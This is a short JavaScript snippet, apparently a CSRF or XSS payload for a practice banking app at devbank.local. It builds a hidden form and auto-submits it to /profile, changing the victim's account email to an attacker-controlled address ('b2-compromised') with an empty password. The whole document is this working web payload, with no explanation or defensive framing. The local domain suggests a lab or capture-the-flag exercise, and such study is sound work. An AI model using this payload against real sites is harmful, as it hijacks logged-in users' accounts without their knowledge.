const form = document.createElement("form");

form.method = "POST";

form.action = "/profile";

const email = document.createElement("input");

email.type = "hidden";

email.name = "email";

email.value = "b2-compromised@devbank.local";

const password = document.createElement("input");

password.type = "hidden";

password.name = "password";

password.value = "";

form.appendChild(email);

form.appendChild(password);

document.body.appendChild(form);

form.submit();
